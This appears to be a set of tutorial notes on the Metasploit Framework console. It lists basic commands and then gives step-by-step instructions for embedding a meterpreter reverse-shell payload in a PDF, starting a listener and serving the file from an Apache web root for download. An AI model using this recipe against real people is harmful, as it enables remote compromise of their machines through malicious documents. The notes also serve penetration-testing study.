# Metasploit Framework - Ethical Hacking

## Steps:

1. Start Postgres database service 
   
   ```shell
   service postgresql start
   ```

2. Start msfconsole:
   
   ```shell
   msfconsole
   ```

Modules in Metaploit include:

- **Exploits** - takes advantage of a system's vulnerabilty

- **Payloads** - is what is planted on the target system to gain access to exploit a system's vulnerability

- **Post**

- **Encoders**

- **Auxiliary**

- **Nops**

> 📌**Help** command  - show most of accepted commands in the console.

***use*** Command: 

Allow usage of modules e.g

```shell
use exploit/windows/browser/adobe_flash_avm2
```

***show*** Command:

Gives more information about a module being used

***show options*** Command: 

Gives the options that can be changed for a module depending on the exploit

***show payloads*** Command:

Provide alls the paylods compatible with the exploit

***show targets*** Command:

Display the targets to be expoited

***show info*** Command:

Gives more information about the exploit

***search*** Command: 

Gives one the ability to find the module that one needs

It has also keywords such as:

1. **platform** - search for the targeted platform

2. **type** - type of module being searched

3. **name** - specifying the name of the exploit if known

```shell
search type:exploit platform:windows meterpreter
```

***set*** Command:

Allows to change the options available for a module depending on an exploit

```shell
set LHOST 192.168.139.133

set LPORT 4444
```

> 📌 use ***show options*** command to view if all the options are set

***exploit*** Command:

Runs the exploit together using all the set options

***back*** Command:

takes one a step back from the previous ran command

***exit*** Command:

Quits the msfconsole

---

## Embedding Payloads to PDF Documents

#### Create the PDF:

Search and use the exploit:

```shell
use exploit/windows/fileformat/adobe_pdf_embedded_exe
```

Set payload:

```shell
set payload windows/x64/meterpreter/reverse_tcp
```

Set other options e.g LHOST, LPORT, FILENAME, INFILENAME e.t.c

> 📌 _**INFILENAME** option is where you provide the path to the custom file to embed the payload with._
> 
> ```shell
> set INFILENAME /<USERNAME>/Documents/custom.pdf
> ```

Then run the command `exploit` to create the pdf file.



#### Run the listener:

Run the listener:

```shell
use exploit/multi/handler
```

Set the payload:

```shell
set payload windows/x64/meterpreter/reverse_tcp
```

Set other options e.g LHOST, LPORT



Then run the command `exploit` to run the listener.



#### Serve the PDF w/ Apache Web Server:

Move the payload to apache server and serve it for it to be downloaded:

```shell
sudo mv /root/.msf4/local/<FILENAME>.pdf /var/www/html/<FILENAME>.pdf
```
